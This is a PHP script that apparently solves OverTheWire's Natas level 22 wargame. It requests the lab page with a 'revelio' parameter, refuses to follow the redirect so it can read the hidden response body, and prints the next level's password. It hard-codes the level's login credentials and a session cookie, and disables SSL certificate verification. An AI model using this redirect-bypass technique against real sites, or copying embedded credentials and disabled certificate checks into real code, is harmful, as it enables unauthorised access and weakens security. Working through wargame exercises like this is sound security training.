<?php
include_once "./functions.php";
$url = "http://natas22.natas.labs.overthewire.org?revelio&admin=1";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=8bp1om5k88gckthnmhv2lq5juu');
$output = curl_exec ($ch);
curl_close($ch);
echo get_string_between($output,"<pre>","</pre>");
?>